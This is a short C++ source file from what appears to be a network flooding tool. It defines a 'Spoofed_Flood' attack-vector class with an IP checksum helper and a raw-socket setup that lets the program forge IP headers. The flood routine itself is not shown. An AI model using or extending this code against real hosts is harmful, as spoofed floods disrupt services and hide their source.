
#include <sys/socket.h>
#include <netinet/in.h>
#include "../Headers/Spoofed_Flood.hpp"

Spoofed_Flood::Spoofed_Flood(const config *conf, Logger *logger) : Attack_Vector(conf, logger){

}

unsigned short Spoofed_Flood::csum(unsigned short *buf, int len) {
    unsigned long sum;
    for(sum=0; len>0; len--){
        sum += *buf++;
    }
    sum = (sum >> 16) + (sum &0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

int Spoofed_Flood::make_socket(int protocol) {
    int sock, on = 1;
    if((sock = socket(AF_INET, SOCK_RAW, protocol)) == -1){
        logger->Log("socket() error", Logger::Error);
        exit(EXIT_FAILURE);
    }

    if(setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) == -1){
        logger->Log("setsockopt() error", Logger::Error);
        exit(EXIT_FAILURE);
    }
    return sock;
}